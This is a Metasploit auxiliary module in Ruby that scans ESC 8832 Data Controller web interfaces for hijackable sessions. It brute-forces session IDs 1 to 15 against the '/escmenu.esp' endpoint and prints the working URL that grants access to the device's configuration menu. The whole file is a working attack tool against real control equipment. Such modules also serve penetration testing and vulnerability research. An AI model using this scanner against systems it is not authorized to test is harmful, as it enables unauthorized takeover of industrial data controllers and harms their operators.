##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'ESC 8832 Data Controller Session Hijack Scanner',
      'Description' => %q{ This module detects if an active session is present and hijackable on the target ESC 8832 web interface.},
      'Author'      => ['Balazs Makany'],
      'References'  =>
      [
        ['URL', 'https://www.th3r3g3nt.com/?p=28'],
      ],
      'License'     => MSF_LICENSE
    ))

    register_options([
        Opt::RPORT(80),
        OptBool.new('STOP_ON_SUCCESS', [true, "Stop when a live session was found", true]),
    ])
    deregister_options('RHOST')
  end

  def run_host(target_host)
        result = []
        begin
                ('1'.. '15').each do |u|
                print_status("Scanning #{target_host} - with Session ID '#{u}'")

                #Just to be on the safe side here.
                sleep(1)

                res = send_request_raw({
                'uri'     => '/escmenu.esp?sessionid='+u+'&menuid=6',
                'method'  => 'GET',
                'headers' => { 'Connection' => 'Close' }
                }, 25)

                if (res and res.code == 200 and res.body)
                    if res.body.match(/(Configuration\sMenu)/im)
                        print_good("#{target_host} - Active Session found as #{u}!")
                        print_good("Complete request: http://#{target_host}/escmenu.esp?sessionid=#{u}&menuid=6")
                        report_vuln(
                         {
                            :host  => target_host,
                            :port  => datastore['RPORT'],
                            :name  => "ESC 8832 Web Vulnerability",
                            :info  => "Module #{self.fullname} confirmed a valid session (#{u}) on the ESC 8832 Web Interface",
                         }
                        )
                        break if datastore['STOP_ON_SUCCESS']
                    end
                    if res.body.match(/(Access\sDenied!)/im)
                        print_status("  Dead session")
                    end
                end
        end

        rescue ::Interrupt
                raise $!
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
                print_error("Timeout or no connection on #{rhost}:#{rport}")
                return
        rescue ::Exception => e
                print_error("#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}")
                return
   end
end
end
